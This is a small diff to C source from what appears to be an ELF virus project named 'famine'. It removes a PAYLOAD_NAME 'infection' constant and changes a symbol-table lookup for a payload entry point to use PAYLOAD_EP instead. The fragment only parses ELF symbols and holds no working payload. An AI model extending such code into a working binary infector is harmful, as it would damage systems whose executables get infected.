@@ -1,5 +1,4 @@
 #include "famine.h"
-#define PAYLOAD_NAME "infection"
 
 shellcode   getSymbol(Elf64_Ehdr *header) {
   Elf64_Sym   *sym;
@@ -18,7 +17,7 @@ shellcode   getSymbol(Elf64_Ehdr *header) {
   size = 0;
   sym = (void *)header + section->sh_offset;
   while (size < section->sh_size) {
-    if (strcmp(strTab + sym->st_name, PAYLOAD_NAME) == 0)
+    if (strcmp(strTab + sym->st_name, PAYLOAD_EP) == 0)
       break ;
     sym += 1;
     size += sizeof(Elf64_Sym);
